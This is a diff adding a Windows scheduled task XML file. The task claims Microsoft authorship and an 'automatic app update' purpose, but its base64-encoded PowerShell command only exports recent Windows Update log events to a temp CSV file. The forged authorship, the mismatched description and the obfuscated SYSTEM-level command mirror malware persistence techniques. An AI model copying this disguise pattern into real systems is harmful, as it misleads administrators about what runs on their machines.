@@ -1,0 +1,44 @@
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Date>2024-03-12T00:00:00</Date>
+    <Author>Microsoft Corporation</Author>
+    <Description>Enables Windows to install application updates automatically.</Description>
+    <URI>\Microsoft\Windows\WindowsUpdate\Automatic App Update</URI>
+  </RegistrationInfo>
+  <Triggers>
+    <CalendarTrigger>
+      <StartBoundary>2024-03-12T09:00:00</StartBoundary>
+      <Enabled>true</Enabled>
+      <ScheduleByDay>
+        <DaysInterval>1</DaysInterval>
+      </ScheduleByDay>
+    </CalendarTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>LeastPrivilege</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
+    <Enabled>true</Enabled>
+    <Hidden>false</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe</Command>
+      <Arguments>-NonInteractive -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnADsARwBlAHQALQBXAGkAbgBFAHYAZQBuAHQAIAAtAEwAbwBnAE4AYQBtAGUAIAAnAE0AaQBjAHIAbwBzAG8AZgB0AC0AVwBpAG4AZABvAHcAcwAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAQwBsAGkAZQBuAHQALwBPAHAAZQByAGEAdABpAG8AbgBhAGwAJwAgAC0ATQBhAHgARQB2AGUAbgB0AHMAIAAxADAAfABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAAVABpAG0AZQBDAHIAZQBhAHQAZQBkACwATQBlAHMAcwBhAGcAZQB8AEUAeABwAG8AcgB0AC0AQwBzAHYAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAdwB1AF8AaABlAGEAbAB0AGgALgBjAHMAdgAiACAALQBOAG8AVAB5AHAAZQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4A</Arguments>
+    </Exec>
+  </Actions>
+</Task>
